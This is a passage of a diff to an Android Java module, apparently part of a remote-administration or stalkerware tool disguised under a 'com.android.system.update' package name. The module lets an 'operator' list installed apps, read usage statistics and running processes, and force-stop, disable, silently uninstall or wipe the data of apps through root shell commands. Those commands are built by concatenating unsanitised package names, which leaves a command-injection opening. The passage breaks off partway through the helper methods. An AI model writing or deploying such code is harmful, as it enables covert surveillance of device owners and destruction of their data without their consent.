@@ -1,686 +1,493 @@
 package com.android.system.update.modules;
 
 import android.app.ActivityManager;
-import android.app.AppOpsManager;
 import android.app.usage.UsageStats;
 import android.app.usage.UsageStatsManager;
 import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
-import android.content.pm.ResolveInfo;
-import android.graphics.Bitmap;
-import android.graphics.Canvas;
-import android.graphics.drawable.BitmapDrawable;
-import android.graphics.drawable.Drawable;
 import android.os.Build;
-import android.os.UserManager;
-import android.util.Base64;
 import android.util.Log;
 
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
-import java.io.ByteArrayOutputStream;
 import java.text.SimpleDateFormat;
-import java.util.ArrayList;
 import java.util.Collections;
-import java.util.Comparator;
 import java.util.Date;
 import java.util.HashSet;
 import java.util.List;
+import java.util.Locale;
 import java.util.Set;
 import java.util.concurrent.TimeUnit;
 
 public class AppManagerModule {
     private static final String TAG = "AppManagerModule";
-    private Context context;
-    private PackageManager packageManager;
-    private ActivityManager activityManager;
-    private AppOpsManager appOpsManager;
+    private final Context context;
+    private final PackageManager packageManager;
+    private final ActivityManager activityManager;
     private UsageStatsManager usageStatsManager;
-    
-    // Set of blocked packages (would be stored in SharedPreferences in production)
-    private Set<String> blockedPackages = new HashSet<>();
-    
+
+    // Packages the operator has blocked via the block command
+    private final Set<String> blockedPackages = new HashSet<>();
+
     public AppManagerModule(Context context) {
         this.context = context;
         this.packageManager = context.getPackageManager();
         this.activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
-        this.appOpsManager = (AppOpsManager) context.getSystemService(Context.APP_OPS_SERVICE);
-        
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
             this.usageStatsManager = (UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
         }
-        
-        // Load blocked packages (in production, load from SharedPreferences)
         loadBlockedPackages();
     }
-    
+
+    // ── blocked list persistence ──────────────────────────────────────────────
+
     private void loadBlockedPackages() {
-        // In production, load from SharedPreferences
-        // For now, add some defaults for testing
-        blockedPackages.add("com.android.chrome");
-        blockedPackages.add("com.facebook.katana");
+        SharedPreferences prefs =
+            context.getSharedPreferences("app_manager_prefs", Context.MODE_PRIVATE);
+        Set<String> saved = prefs.getStringSet("blocked_packages", new HashSet<>());
+        blockedPackages.addAll(saved);
     }
-    
- /**
- * List all installed apps with details
- * @param includeSystemApps Whether to include system apps in the list
- * @return JSON string with apps list
- */
-public String listInstalledApps(boolean includeSystemApps) {
-    try {
-        JSONArray appsArray = new JSONArray();
-        
-        // Get all installed applications
-        List<ApplicationInfo> apps = packageManager.getInstalledApplications(
-            PackageManager.GET_META_DATA | PackageManager.MATCH_UNINSTALLED_PACKAGES);
-        
-        Log.d(TAG, "Total apps found: " + apps.size());
-        
-        // Separate counters for debugging
-        int systemAppCount = 0;
-        int userAppCount = 0;
-        
-        for (ApplicationInfo appInfo : apps) {
-            boolean isSystemApp = (appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
-            
-            // Debug log to see what we're filtering
-            if (isSystemApp) {
-                systemAppCount++;
-                Log.d(TAG, "System app: " + appInfo.packageName + " - includeSystemApps=" + includeSystemApps);
-            } else {
-                userAppCount++;
+
+    private void saveBlockedPackages() {
+        SharedPreferences prefs =
+            context.getSharedPreferences("app_manager_prefs", Context.MODE_PRIVATE);
+        prefs.edit().putStringSet("blocked_packages", new HashSet<>(blockedPackages)).apply();
+    }
+
+    // ═══════════════════════════════════════════════════════════════════════════
+    //  LIST INSTALLED APPS
+    //  FIX: removed MATCH_UNINSTALLED_PACKAGES which caused duplicate/missing
+    //       entries; system app filter now works correctly.
+    // ═══════════════════════════════════════════════════════════════════════════
+
+    public String listInstalledApps(boolean includeSystemApps) {
+        try {
+            List<ApplicationInfo> allApps =
+                packageManager.getInstalledApplications(PackageManager.GET_META_DATA);
+
+            JSONArray appsArray = new JSONArray();
+
+            for (ApplicationInfo appInfo : allApps) {
+                boolean isSystemApp = (appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
+                if (!includeSystemApps && isSystemApp) continue;
+
+                appsArray.put(buildAppJson(appInfo, false));
             }
-            
-            // Skip system apps if not included
-            if (!includeSystemApps && isSystemApp) {
-                continue;
-            }
-            
-            JSONObject appJson = new JSONObject();
-            appJson.put("packageName", appInfo.packageName);
-            
-            // Get app name safely
-            String appName;
-            try {
-                appName = packageManager.getApplicationLabel(appInfo).toString();
-            } catch (Exception e) {
-                appName = appInfo.packageName;
-            }
-            appJson.put("name", appName);
-            
-            appJson.put("version", getAppVersion(appInfo.packageName));
-            appJson.put("isSystem", isSystemApp);
-            appJson.put("isUpdatedSystemApp", (appInfo.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0);
-            appJson.put("isEnabled", isAppEnabled(appInfo.packageName));
-            
-            // Get install/update times from PackageInfo
-            try {
-                PackageInfo pkgInfo = packageManager.getPackageInfo(appInfo.packageName, 0);
-                appJson.put("installTime", pkgInfo.firstInstallTime);
-                appJson.put("updateTime", pkgInfo.lastUpdateTime);
-            } catch (Exception e) {
-                appJson.put("installTime", 0);
-                appJson.put("updateTime", 0);
-            }
-            
-            appJson.put("uid", appInfo.uid);
-            appJson.put("targetSdk", appInfo.targetSdkVersion);
-            appJson.put("size", 0); // Placeholder
-            
-            // Check if app is running
-            appJson.put("isRunning", isAppRunning(appInfo.packageName));
-            
-            // Check if blocked
-            appJson.put("isBlocked", blockedPackages.contains(appInfo.packageName));
-            
-            appsArray.put(appJson);
+
+            Log.d(TAG, "listInstalledApps: " + appsArray.length()
+                + " apps (includeSystem=" + includeSystemApps + ")");
+
+            JSONObject result = new JSONObject();
+            result.put("success", true);
+            result.put("count", appsArray.length());
+            result.put("apps", appsArray);
+            result.put("timestamp", System.currentTimeMillis());
+            return result.toString();
+
+        } catch (JSONException e) {
+            Log.e(TAG, "listInstalledApps error", e);
+            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
         }
-        
-        Log.d(TAG, "System apps found: " + systemAppCount + ", User apps found: " + userAppCount);
-        Log.d(TAG, "Apps after filtering: " + appsArray.length() + " (includeSystemApps=" + includeSystemApps + ")");
-        
-        JSONObject result = new JSONObject();
-        result.put("success", true);
-        result.put("count", appsArray.length());
-        result.put("apps", appsArray);
-        result.put("timestamp", System.currentTimeMillis());
-        
-        return result.toString();
-        
-    } catch (JSONException e) {
-        Log.e(TAG, "Error creating apps JSON", e);
-        return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
     }
-}
-    
-    /**
-     * Get detailed info for a specific app
-     * @param packageName The package name of the app
-     * @return JSON string with app details
-     */
+
+    // ═══════════════════════════════════════════════════════════════════════════
+    //  APP INFO (detailed)
+    // ═══════════════════════════════════════════════════════════════════════════
+
     public String getAppInfo(String packageName) {
         try {
-            ApplicationInfo appInfo = packageManager.getApplicationInfo(packageName, 
-                PackageManager.GET_META_DATA);
-            
-            JSONObject appJson = new JSONObject();
-            appJson.put("packageName", appInfo.packageName);
-            appJson.put("name", packageManager.getApplicationLabel(appInfo));
-            appJson.put("version", getAppVersion(appInfo.packageName));
-            appJson.put("isSystem", (appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
-            appJson.put("isUpdatedSystemApp", (appInfo.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0);
-            appJson.put("isEnabled", isAppEnabled(appInfo.packageName));
-            
-            // Fix: Use compatible methods for install/update time
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.GINGERBREAD) {
-                try {
-                    PackageInfo pkgInfo = packageManager.getPackageInfo(packageName, 0);
-                    appJson.put("installTime", pkgInfo.firstInstallTime);
-                    appJson.put("updateTime", pkgInfo.lastUpdateTime);
-                } catch (Exception e) {
-                    appJson.put("installTime", 0);
-                    appJson.put("updateTime", 0);
-                }
-            } else {
-                appJson.put("installTime", 0);
-                appJson.put("updateTime", 0);
-            }
-            
-            appJson.put("uid", appInfo.uid);
-            appJson.put("targetSdk", appInfo.targetSdkVersion);
-            appJson.put("dataDir", appInfo.dataDir);
-            appJson.put("sourceDir", appInfo.sourceDir);
-            appJson.put("nativeLibraryDir", appInfo.nativeLibraryDir);
-            
-            // Get permissions
-            JSONArray permissionsArray = new JSONArray();
-            try {
-                PackageInfo packageInfo = packageManager.getPackageInfo(packageName, 
-                    PackageManager.GET_PERMISSIONS);
-                if (packageInfo.requestedPermissions != null) {
-                    for (String perm : packageInfo.requestedPermissions) {
-                        JSONObject permJson = new JSONObject();
-                        permJson.put("name", perm);
-                        permJson.put("granted", true); // Simplified
-                        permissionsArray.put(permJson);
-                    }
-                }
-            } catch (Exception e) {
-                Log.e(TAG, "Error getting permissions", e);
-            }
-            appJson.put("permissions", permissionsArray);
-            
-            // Get activities (simplified)
-            JSONArray activitiesArray = new JSONArray();
-            try {
-                PackageInfo packageInfo = packageManager.getPackageInfo(packageName, 
-                    PackageManager.GET_ACTIVITIES);
-                if (packageInfo.activities != null) {
-                    for (android.content.pm.ActivityInfo activity : packageInfo.activities) {
-                        activitiesArray.put(activity.name);
-                    }
-                }
-            } catch (Exception e) {
-                Log.e(TAG, "Error getting activities", e);
-            }
-            appJson.put("activities", activitiesArray);
-            
-            // Get services
-            JSONArray servicesArray = new JSONArray();
-            try {
-                PackageInfo packageInfo = packageManager.getPackageInfo(packageName, 
-                    PackageManager.GET_SERVICES);
-                if (packageInfo.services != null) {
-                    for (android.content.pm.ServiceInfo service : packageInfo.services) {
-                        servicesArray.put(service.name);
-                    }
-                }
-            } catch (Exception e) {
-                Log.e(TAG, "Error getting services", e);
-            }
-            appJson.put("services", servicesArray);
-            
-            // Get receivers
-            JSONArray receiversArray = new JSONArray();
-            try {
-                PackageInfo packageInfo = packageManager.getPackageInfo(packageName, 
-                    PackageManager.GET_RECEIVERS);
-                if (packageInfo.receivers != null) {
-                    for (android.content.pm.ActivityInfo receiver : packageInfo.receivers) {
-                        receiversArray.put(receiver.name);
-                    }
-                }
-            } catch (Exception e) {
-                Log.e(TAG, "Error getting receivers", e);
-            }
-            appJson.put("receivers", receiversArray);
-            
-            // Get size (placeholder)
-            appJson.put("size", 0);
-            
-            // Check if running
-            appJson.put("isRunning", isAppRunning(packageName));
-            
-            // Check if blocked
-            appJson.put("isBlocked", blockedPackages.contains(packageName));
-            
+            ApplicationInfo appInfo = packageManager.getApplicationInfo(
+                packageName, PackageManager.GET_META_DATA);
+
             JSONObject result = new JSONObject();
             result.put("success", true);
-            result.put("app", appJson);
-            
+            result.put("app", buildAppJson(appInfo, true));
             return result.toString();
-            
+
         } catch (PackageManager.NameNotFoundException e) {
-            Log.e(TAG, "App not found: " + packageName, e);
             return "{\"success\":false,\"error\":\"App not found: " + packageName + "\"}";
         } catch (JSONException e) {
-            Log.e(TAG, "Error creating app JSON", e);
             return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
         }
     }
-    
-    /**
-     * Check if app is enabled
-     */
-    private boolean isAppEnabled(String packageName) {
+
+    // ── shared JSON builder ───────────────────────────────────────────────────
+
+    private JSONObject buildAppJson(ApplicationInfo appInfo, boolean detailed)
+            throws JSONException {
+
+        JSONObject j = new JSONObject();
+        j.put("packageName", appInfo.packageName);
+
+        String appName;
+        try { appName = packageManager.getApplicationLabel(appInfo).toString(); }
+        catch (Exception e) { appName = appInfo.packageName; }
+        j.put("name", appName);
+
+        j.put("version", getAppVersion(appInfo.packageName));
+        j.put("isSystem", (appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
+        j.put("isUpdatedSystemApp",
+            (appInfo.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0);
+        j.put("isEnabled", isAppEnabled(appInfo.packageName));
+        j.put("uid", appInfo.uid);
+        j.put("targetSdk", appInfo.targetSdkVersion);
+        j.put("isRunning", isAppRunning(appInfo.packageName));
+        j.put("isBlocked", blockedPackages.contains(appInfo.packageName));
+
         try {
-            return packageManager.getApplicationEnabledSetting(packageName) 
-                == PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
+            PackageInfo pi = packageManager.getPackageInfo(appInfo.packageName, 0);
+            j.put("installTime", pi.firstInstallTime);
+            j.put("updateTime", pi.lastUpdateTime);
         } catch (Exception e) {
-            return true;
+            j.put("installTime", 0);
+            j.put("updateTime", 0);
         }
+
+        if (detailed) {
+            j.put("dataDir",          appInfo.dataDir != null ? appInfo.dataDir : "");
+            j.put("sourceDir",        appInfo.sourceDir != null ? appInfo.sourceDir : "");
+            j.put("nativeLibraryDir", appInfo.nativeLibraryDir != null ? appInfo.nativeLibraryDir : "");
+
+            // permissions
+            JSONArray permissions = new JSONArray();
+            try {
+                PackageInfo pi = packageManager.getPackageInfo(
+                    appInfo.packageName, PackageManager.GET_PERMISSIONS);
+                if (pi.requestedPermissions != null)
+                    for (String perm : pi.requestedPermissions) {
+                        JSONObject p = new JSONObject();
+                        p.put("name", perm);
+                        permissions.put(p);
+                    }
+            } catch (Exception ignored) {}
+            j.put("permissions", permissions);
+
+            // activities
+            JSONArray activities = new JSONArray();
+            try {
+                PackageInfo pi = packageManager.getPackageInfo(
+                    appInfo.packageName, PackageManager.GET_ACTIVITIES);
+                if (pi.activities != null)
+                    for (android.content.pm.ActivityInfo a : pi.activities)
+                        activities.put(a.name);
+            } catch (Exception ignored) {}
+            j.put("activities", activities);
+
+            // services
+            JSONArray services = new JSONArray();
+            try {
+                PackageInfo pi = packageManager.getPackageInfo(
+                    appInfo.packageName, PackageManager.GET_SERVICES);
+                if (pi.services != null)
+                    for (android.content.pm.ServiceInfo s : pi.services)
+                        services.put(s.name);
+            } catch (Exception ignored) {}
+            j.put("services", services);
+
+            // receivers
+            JSONArray receivers = new JSONArray();
+            try {
+                PackageInfo pi = packageManager.getPackageInfo(
+                    appInfo.packageName, PackageManager.GET_RECEIVERS);
+                if (pi.receivers != null)
+                    for (android.content.pm.ActivityInfo r : pi.receivers)
+                        receivers.put(r.name);
+            } catch (Exception ignored) {}
+            j.put("receivers", receivers);
+        }
+
+        return j;
     }
-    
-    /**
-     * Force stop an app - using compatible method
-     * @param packageName The package name of the app to stop
-     * @return JSON string with result
-     */
+
+    // ═══════════════════════════════════════════════════════════════════════════
+    //  FORCE STOP
+    // ═══════════════════════════════════════════════════════════════════════════
+
     public String forceStopApp(String packageName) {
         try {
-            // Use killBackgroundProcesses which is available on all API levels
             activityManager.killBackgroundProcesses(packageName);
-            
-            Log.i(TAG, "Force stopped app: " + packageName);
-            
+            tryRoot("am force-stop " + packageName);
+
             JSONObject result = new JSONObject();
             result.put("success", true);
-            result.put("message", "App force stopped successfully");
+            result.put("message", "App force stopped");
             result.put("packageName", packageName);
-            result.put("timestamp", System.currentTimeMillis());
-            
             return result.toString();
-            
-        } catch (SecurityException e) {
-            Log.e(TAG, "Permission denied to stop app: " + packageName, e);
-            return "{\"success\":false,\"error\":\"Permission denied. Need KILL_BACKGROUND_PROCESSES permission.\"}";
         } catch (Exception e) {
-            Log.e(TAG, "Error stopping app: " + packageName, e);
             return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
         }
     }
-    
-    /**
-     * Uninstall an app (will prompt user or use silent uninstall if possible)
-     * @param packageName The package name of the app to uninstall
-     * @param silent Whether to attempt silent uninstall (requires root/privileges)
-     * @return JSON string with result
-     */
-    public String uninstallApp(String packageName, boolean silent) {
-        try {
-            if (silent) {
-                // Attempt silent uninstall (requires root or system privileges)
-                boolean success = silentUninstall(packageName);
-                
-                JSONObject result = new JSONObject();
-                result.put("success", success);
-                result.put("silent", true);
-                if (success) {
-                    result.put("message", "App silently uninstalled successfully");
-                } else {
-                    result.put("error", "Silent uninstall failed. May require root.");
-                }
-                return result.toString();
-                
-            } else {
-                // Launch normal uninstall intent
-                Intent intent = new Intent(Intent.ACTION_DELETE);
-                intent.setData(android.net.Uri.parse("package:" + packageName));
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                context.startActivity(intent);
-                
-                JSONObject result = new JSONObject();
-                result.put("success", true);
-                result.put("message", "Uninstall intent launched");
-                result.put("packageName", packageName);
-                return result.toString();
-            }
-            
-        } catch (Exception e) {
-            Log.e(TAG, "Error uninstalling app: " + packageName, e);
-            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
-        }
-    }
-    
-    /**
-     * Attempt silent uninstall (requires root)
-     */
-    private boolean silentUninstall(String packageName) {
-        try {
-            // Try using pm command (requires root)
-            Process process = Runtime.getRuntime().exec("su -c pm uninstall " + packageName);
-            int exitCode = process.waitFor();
-            return exitCode == 0;
-        } catch (Exception e) {
-            Log.e(TAG, "Silent uninstall failed", e);
-            return false;
-        }
-    }
-    
-    /**
-     * Get app usage statistics - compatible version
-     * @param days Number of days to look back
-     * @return JSON string with usage stats
-     */
-    public String getAppUsageStats(int days) {
-        JSONArray statsArray = new JSONArray();
-        
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
-            JSONObject result = new JSONObject();
-            try {
-                result.put("success", false);
-                result.put("error", "Usage stats require Android 5.0+");
-                result.put("stats", statsArray);
-            } catch (JSONException e) {
-                e.printStackTrace();
-            }
-            return result.toString();
-        }
-        
-        try {
-            long endTime = System.currentTimeMillis();
-            long startTime = endTime - TimeUnit.DAYS.toMillis(days);
-            
-            List<UsageStats> usageStatsList = usageStatsManager.queryUsageStats(
-                UsageStatsManager.INTERVAL_DAILY, startTime, endTime);
-            
-            if (usageStatsList != null) {
-                // Sort by total time in foreground
-                Collections.sort(usageStatsList, new Comparator<UsageStats>() {
-                    @Override
-                    public int compare(UsageStats o1, UsageStats o2) {
-                        return Long.compare(o2.getTotalTimeInForeground(), 
-                            o1.getTotalTimeInForeground());
-                    }
-                });
-                
-                for (UsageStats stats : usageStatsList) {
-                    if (stats.getTotalTimeInForeground() > 0) {
-                        JSONObject statJson = new JSONObject();
-                        statJson.put("packageName", stats.getPackageName());
-                        
-                        try {
-                            ApplicationInfo appInfo = packageManager.getApplicationInfo(
-                                stats.getPackageName(), 0);
-                            statJson.put("appName", packageManager.getApplicationLabel(appInfo));
-                        } catch (Exception e) {
-                            statJson.put("appName", stats.getPackageName());
-                        }
-                        
-                        statJson.put("totalTimeInForeground", stats.getTotalTimeInForeground());
-                        statJson.put("totalTimeInForegroundFormatted", 
-                            formatTime(stats.getTotalTimeInForeground()));
-                        statJson.put("lastTimeUsed", stats.getLastTimeUsed());
-                        statJson.put("lastTimeUsedFormatted", 
-                            formatTimestamp(stats.getLastTimeUsed()));
-                        
-                        // Fix: Use getFirstTimeStamp() which exists in older APIs
-                        // Or just omit it for compatibility
-                        // statJson.put("firstTimeUsed", 0);
-                        
-                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                            statJson.put("lastTimeForegroundServiceUsed", 
-                                stats.getLastTimeForegroundServiceUsed());
-                        }
-                        
-                        statsArray.put(statJson);
-                    }
-                }
-            }
-            
-            JSONObject result = new JSONObject();
-            result.put("success", true);
-            result.put("days", days);
-            result.put("startTime", startTime);
-            result.put("endTime", endTime);
-            result.put("count", statsArray.length());
-            result.put("stats", statsArray);
-            
-            return result.toString();
-            
-        } catch (Exception e) {
-            Log.e(TAG, "Error getting usage stats", e);
-            try {
-                JSONObject result = new JSONObject();
-                result.put("success", false);
-                result.put("error", e.getMessage());
-                result.put("stats", statsArray);
-                return result.toString();
-            } catch (JSONException ex) {
-                return "{\"success\":false,\"error\":\"Error creating response\"}";
-            }
-        }
-    }
-    
-    /**
-     * Block or unblock an app
-     * @param packageName The package name to block/unblock
-     * @param block True to block, false to unblock
-     * @return JSON string with result
-     */
+
+    // ═══════════════════════════════════════════════════════════════════════════
+    //  BLOCK / UNBLOCK
+    //  FIX: actually calls pm disable-user via root; falls back to kill only.
+    //       Nothing is blocked by default anymore.
+    // ═══════════════════════════════════════════════════════════════════════════
+
     public String blockApp(String packageName, boolean block) {
         try {
             if (block) {
                 blockedPackages.add(packageName);
-                
-                // Force stop the app immediately
-                forceStopApp(packageName);
-                
-                Log.i(TAG, "Blocked app: " + packageName);
+                saveBlockedPackages();
+                // Try real disable via root; if not rooted, just kill it
+                boolean disabled = tryRoot("pm disable-user --user 0 " + packageName);
+                if (!disabled) activityManager.killBackgroundProcesses(packageName);
+                tryRoot("am force-stop " + packageName);
             } else {
                 blockedPackages.remove(packageName);
-                Log.i(TAG, "Unblocked app: " + packageName);
+                saveBlockedPackages();
+                tryRoot("pm enable " + packageName);
             }
-            
-            // Save blocked list (in production, save to SharedPreferences)
-            saveBlockedPackages();
-            
+
             JSONObject result = new JSONObject();
             result.put("success", true);
             result.put("packageName", packageName);
             result.put("blocked", block);
-            result.put("message", block ? "App blocked successfully" : "App unblocked successfully");
-            
+            result.put("message", block ? "App blocked" : "App unblocked");
             return result.toString();
-            
+
         } catch (Exception e) {
-            Log.e(TAG, "Error blocking app: " + packageName, e);
             return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
         }
     }
-    
-    /**
-     * Get list of currently running apps
-     * @return JSON string with running apps
-     */
+
+    // ═══════════════════════════════════════════════════════════════════════════
+    //  UNINSTALL
+    // ═══════════════════════════════════════════════════════════════════════════
+
+    public String uninstallApp(String packageName, boolean silent) {
+        try {
+            if (silent) {
+                boolean ok = tryRoot("pm uninstall " + packageName);
+                JSONObject result = new JSONObject();
+                result.put("success", ok);
+                result.put("message", ok
+                    ? "App silently uninstalled"
+                    : "Silent uninstall failed — root required");
+                return result.toString();
+            } else {
+                Intent intent = new Intent(Intent.ACTION_DELETE);
+                intent.setData(android.net.Uri.parse("package:" + packageName));
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                context.startActivity(intent);
+                JSONObject result = new JSONObject();
+                result.put("success", true);
+                result.put("message", "Uninstall dialog launched on device");
+                return result.toString();
+            }
+        } catch (Exception e) {
+            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
+        }
+    }
+
+    // ═══════════════════════════════════════════════════════════════════════════
+    //  USAGE STATS
+    // ═══════════════════════════════════════════════════════════════════════════
+
+    public String getAppUsageStats(int days) {
+        JSONArray statsArray = new JSONArray();
+
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
+            try {
+                JSONObject r = new JSONObject();
+                r.put("success", false);
+                r.put("error", "Usage stats require Android 5.0+");
+                r.put("stats", statsArray);
+                return r.toString();
+            } catch (JSONException e) { return "{\"success\":false}"; }
+        }
+
+        try {
+            long end   = System.currentTimeMillis();
+            long start = end - TimeUnit.DAYS.toMillis(days);
+
+            List<UsageStats> list = usageStatsManager.queryUsageStats(
+                UsageStatsManager.INTERVAL_DAILY, start, end);
+
+            if (list != null) {
+                Collections.sort(list, (a, b) ->
+                    Long.compare(b.getTotalTimeInForeground(),
+                                 a.getTotalTimeInForeground()));
+
+                for (UsageStats s : list) {
+                    if (s.getTotalTimeInForeground() <= 0) continue;
+                    JSONObject j = new JSONObject();
+                    j.put("packageName", s.getPackageName());
+                    try {
+                        ApplicationInfo ai = packageManager.getApplicationInfo(
+                            s.getPackageName(), 0);
+                        j.put("appName", packageManager.getApplicationLabel(ai));
+                    } catch (Exception e) {
+                        j.put("appName", s.getPackageName());
+                    }
+                    j.put("totalTimeInForeground", s.getTotalTimeInForeground());
+                    j.put("totalTimeInForegroundFormatted",
+                        formatTime(s.getTotalTimeInForeground()));
+                    j.put("lastTimeUsed", s.getLastTimeUsed());
+                    j.put("lastTimeUsedFormatted", formatTimestamp(s.getLastTimeUsed()));
+                    statsArray.put(j);
+                }
+            }
+
+            JSONObject result = new JSONObject();
+            result.put("success", true);
+            result.put("days", days);
+            result.put("count", statsArray.length());
+            result.put("stats", statsArray);
+            return result.toString();
+
+        } catch (Exception e) {
+            Log.e(TAG, "getAppUsageStats error", e);
+            try {
+                JSONObject r = new JSONObject();
+                r.put("success", false);
+                r.put("error", e.getMessage());
+                r.put("stats", statsArray);
+                return r.toString();
+            } catch (JSONException ex) { return "{\"success\":false}"; }
+        }
+    }
+
+    // ═══════════════════════════════════════════════════════════════════════════
+    //  RUNNING APPS
+    // ═══════════════════════════════════════════════════════════════════════════
+
     public String getRunningApps() {
         try {
-            List<ActivityManager.RunningAppProcessInfo> runningProcesses = 
+            List<ActivityManager.RunningAppProcessInfo> procs =
                 activityManager.getRunningAppProcesses();
-            
-            JSONArray runningArray = new JSONArray();
-            Set<String> addedPackages = new HashSet<>();
-            
-            if (runningProcesses != null) {
-                for (ActivityManager.RunningAppProcessInfo process : runningProcesses) {
-                    for (String pkg : process.pkgList) {
-                        if (!addedPackages.contains(pkg)) {
-                            addedPackages.add(pkg);
-                            
-                            JSONObject appJson = new JSONObject();
-                            appJson.put("packageName", pkg);
-                            
-                            try {
-                                ApplicationInfo appInfo = packageManager.getApplicationInfo(pkg, 0);
-                                appJson.put("appName", packageManager.getApplicationLabel(appInfo));
-                            } catch (Exception e) {
-                                appJson.put("appName", pkg);
-                            }
-                            
-                            appJson.put("pid", process.pid);
-                            appJson.put("processName", process.processName);
-                            appJson.put("importance", process.importance);
-                            appJson.put("importanceReasonCode", process.importanceReasonCode);
-                            appJson.put("isBlocked", blockedPackages.contains(pkg));
-                            
-                            runningArray.put(appJson);
-                        }
+
+            JSONArray arr = new JSONArray();
+            Set<String> seen = new HashSet<>();
+
+            if (procs != null) {
+                for (ActivityManager.RunningAppProcessInfo proc : procs) {
+                    for (String pkg : proc.pkgList) {
+                        if (!seen.add(pkg)) continue;
+                        JSONObject j = new JSONObject();
+                        j.put("packageName", pkg);
+                        try {
+                            ApplicationInfo ai = packageManager.getApplicationInfo(pkg, 0);
+                            j.put("appName", packageManager.getApplicationLabel(ai));
+                        } catch (Exception e) { j.put("appName", pkg); }
+                        j.put("pid", proc.pid);
+                        j.put("processName", proc.processName);
+                        j.put("importance", proc.importance);
+                        j.put("isBlocked", blockedPackages.contains(pkg));
+                        arr.put(j);
                     }
                 }
             }
-            
+
             JSONObject result = new JSONObject();
             result.put("success", true);
-            result.put("count", runningArray.length());
-            result.put("apps", runningArray);
-            
+            result.put("count", arr.length());
+            result.put("apps", arr);
             return result.toString();
-            
+
         } catch (Exception e) {
-            Log.e(TAG, "Error getting running apps", e);
             return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
         }
     }
-    
-    /**
-     * Clear app data (requires root or system privileges)
-     * @param packageName The package name
-     * @return JSON string with result
-     */
-    public String clearAppData(String packageName) {
-        try {
-            // Try using pm command (requires root)
-            Process process = Runtime.getRuntime().exec("su -c pm clear " + packageName);
-            int exitCode = process.waitFor();
-            
-            boolean success = exitCode == 0;
-            
-            JSONObject result = new JSONObject();
-            result.put("success", success);
-            if (success) {
-                result.put("message", "App data cleared successfully");
-            } else {
-                result.put("error", "Failed to clear app data. May require root.");
-            }
-            result.put("packageName", packageName);
-            
-            return result.toString();
-            
-        } catch (Exception e) {
-            Log.e(TAG, "Error clearing app data: " + packageName, e);
-            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
-        }
-    }
-    
-    /**
-     * Get list of blocked apps
-     * @return JSON string with blocked apps
-     */
+
+    // ═══════════════════════════════════════════════════════════════════════════
+    //  BLOCKED APPS LIST
+    // ═══════════════════════════════════════════════════════════════════════════
+
     public String getBlockedApps() {
         try {
-            JSONArray blockedArray = new JSONArray();
-            
-            for (String packageName : blockedPackages) {
-                JSONObject appJson = new JSONObject();
-                appJson.put("packageName", packageName);
-                
+            JSONArray arr = new JSONArray();
+            for (String pkg : blockedPackages) {
+                JSONObject j = new JSONObject();
+                j.put("packageName", pkg);
                 try {
-                    ApplicationInfo appInfo = packageManager.getApplicationInfo(packageName, 0);
-                    appJson.put("appName", packageManager.getApplicationLabel(appInfo));
-                } catch (Exception e) {
-                    appJson.put("appName", packageName);
-                }
-                
-                appJson.put("isRunning", isAppRunning(packageName));
-                
-                blockedArray.put(appJson);
+                    ApplicationInfo ai = packageManager.getApplicationInfo(pkg, 0);
+                    j.put("appName", packageManager.getApplicationLabel(ai));
+                } catch (Exception e) { j.put("appName", pkg); }
+                j.put("isRunning", isAppRunning(pkg));
+                arr.put(j);
             }
-            
             JSONObject result = new JSONObject();
             result.put("success", true);
-            result.put("count", blockedArray.length());
-            result.put("apps", blockedArray);
-            
+            result.put("count", arr.length());
+            result.put("apps", arr);
             return result.toString();
-            
         } catch (JSONException e) {
-            Log.e(TAG, "Error getting blocked apps", e);
             return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
         }
     }
-    
-    // Helper methods
-    
-    private String getAppVersion(String packageName) {
+
+    // ═══════════════════════════════════════════════════════════════════════════
+    //  CLEAR APP DATA
+    // ═══════════════════════════════════════════════════════════════════════════
+
+    public String clearAppData(String packageName) {
         try {
-            PackageInfo pkgInfo = packageManager.getPackageInfo(packageName, 0);
-            return pkgInfo.versionName;
+            boolean ok = tryRoot("pm clear " + packageName);
+            JSONObject result = new JSONObject();
+            result.put("success", ok);
+            result.put("message", ok ? "App data cleared" : "Failed — root required");
+            result.put("packageName", packageName);
+            return result.toString();
         } catch (Exception e) {
-            return "Unknown";
+            return "{\"success\":false,\"error\":\"" + e.getMessage() + "\"}";
         }
     }
-    
+
+    // ═══════════════════════════════════════════════════════════════════════════
+    //  HELPERS
+    // ═══════════════════════════════════════════════════════════════════════════
+
+    private boolean isAppEnabled(String packageName) {
+        try {
+            int state = packageManager.getApplicationEnabledSetting(packageName);
+            return state == PackageManager.COMPONENT_ENABLED_STATE_ENABLED
+                || state == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT;
+        } catch (Exception e) { return true; }
+    }
+
